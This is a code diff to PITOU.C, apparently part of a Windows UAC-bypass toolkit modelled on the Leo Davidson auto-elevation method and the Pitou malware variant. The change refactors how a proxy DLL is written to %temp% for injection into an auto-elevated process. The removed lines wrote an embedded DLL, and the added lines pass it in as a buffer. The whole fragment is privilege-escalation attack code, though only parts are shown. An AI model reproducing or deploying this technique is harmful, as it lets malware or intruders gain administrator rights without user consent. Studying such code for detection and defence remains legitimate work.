@@ -4,9 +4,9 @@
 *
 *  TITLE:       PITOU.C
 *
-*  VERSION:     1.10
+*  VERSION:     1.20
 *
-*  DATE:        27 Mar 2015
+*  DATE:        29 Mar 2015
 *
 *  Leo Davidson work based AutoElevation and Pitou new variant.
 *
@@ -18,14 +18,6 @@
 *******************************************************************************/
 #include "global.h"
 #include <shlobj.h>
-
-#ifdef _WIN64
-#include "dll64.h"
-#define INJECTDLL dll64
-#else
-#include "dll32.h"
-#define INJECTDLL dll32
-#endif
 
 ELOAD_PARAMETERS g_ElevParams;
 
@@ -187,14 +179,12 @@ DWORD WINAPI ucmElevatedLoadProc(
 *
 */
 BOOL ucmStandardAutoElevation(
-	DWORD dwType
+	DWORD dwType,
+	PVOID ProxyDll,
+	DWORD ProxyDllSize
 	)
 {
 	BOOL		cond = FALSE, bResult = FALSE;
-#ifndef _DEBUG
-	DWORD		bytesIO;
-	HANDLE		hFile = INVALID_HANDLE_VALUE;
-#endif
 	HINSTANCE   hKrnl, hOle32, hShell32;
 	LPWSTR		lpSourceDll, lpTargetDir, lpTargetProcess;
 	WCHAR		szBuffer[MAX_PATH + 1];
@@ -251,18 +241,12 @@ BOOL ucmStandardAutoElevation(
 		}
 		OutputDebugStringW(g_ElevParams.SourceFilePathAndName);
 
-#ifndef _DEBUG
-		//drop proxy dll to %temp%
-		hFile = CreateFileW(g_ElevParams.SourceFilePathAndName,
-			GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
-
-		if (hFile == INVALID_HANDLE_VALUE) {
+		if (supWriteBufferToFile(g_ElevParams.SourceFilePathAndName, 
+			ProxyDll, ProxyDllSize) != TRUE)
+		{
 			break;
 		}
 
-		WriteFile(hFile, INJECTDLL, sizeof(INJECTDLL), &bytesIO, NULL);
-		CloseHandle(hFile);
-#endif		
 		//dest directory
 		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
 		lstrcpyW(szBuffer, lpTargetDir);
